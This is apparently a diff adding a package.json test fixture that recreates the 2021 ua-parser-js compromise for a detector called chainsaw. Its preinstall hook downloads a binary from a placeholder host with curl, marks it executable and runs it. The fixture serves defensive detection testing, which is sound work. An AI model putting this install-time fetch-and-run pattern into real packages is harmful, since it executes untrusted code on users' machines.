@@ -1,0 +1,8 @@
+{
+  "name": "ua-parser-js-historic-fixture",
+  "version": "0.7.29",
+  "description": "Sanitized recreation of the October 2021 ua-parser-js@0.7.29 takeover. The compromised tag shipped a preinstall hook that, on Linux/macOS, downloaded a Linux/macOS XMRig miner via curl into /tmp and a Windows variant via PowerShell. The structural shape — preinstall doing curl to a placeholder URL plus a chmod+exec — is what chainsaw's install-script detector flags; placeholders replace the live exfil hosts so this fixture is safe to commit.",
+  "scripts": {
+    "preinstall": "curl -s EXFIL_PLACEHOLDER/jsextension -o /tmp/jsextension && chmod +x /tmp/jsextension && /tmp/jsextension"
+  }
+}
